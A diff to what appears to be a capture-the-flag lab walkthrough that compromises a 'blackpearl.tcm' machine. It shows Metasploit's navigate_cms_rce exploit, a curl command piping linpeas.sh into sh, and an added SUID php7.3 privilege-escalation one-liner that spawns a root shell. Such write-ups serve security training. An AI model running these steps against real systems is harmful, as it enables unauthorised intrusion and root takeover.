@@ -121,7 +121,7 @@ ffuf -u http://blackpearl.tcm/FUZZ -w /usr/share/wordlists/dirbuster/directory-l
   <img width="1263" height="677" alt="image" src="https://github.com/user-attachments/assets/ec195d48-4290-4d05-b662-7d31f6745d71" />
 
 ```bash
-  sudo msfconsole
+sudo msfconsole
 use exploit/multi/http/navigate_cms_rce      
 set RHOSTS 192.168.38.128    
 set VHOST blackpearl.tcm    
@@ -152,5 +152,22 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```bash
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
+
+<img width="1067" height="789" alt="image" src="https://github.com/user-attachments/assets/f9219bd4-bda7-477b-b759-e7d6e98daee1" />  
+<img width="806" height="371" alt="image" src="https://github.com/user-attachments/assets/b36fe50d-4730-4c39-9dfe-afae74363de3" />  
+
+- After Scrolling to **Files with interesting permissions** we found SUID (Set User ID) which is a special Linux permission that allows a program to run with the permissions of the file's owner, rather than the user who runs it.  
+- In our case, `www-data` can run `/usr/bin/php7.3` with root privileges.  
+-We can check **GTFOBins** for a privilege-escalation method. **GTFOBins** is a collection of techniques showing how common Linux programs can be abused for privilege escalation.  
+
+ (https://gtfobins.gm7.org/gtfobins/php/#suid)  
+
+<img width="949" height="301" alt="image" src="https://github.com/user-attachments/assets/abdacf3c-a920-4f13-b3fa-44b065d28b27" />
+
+```bash
+usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+```
+
+
 
 
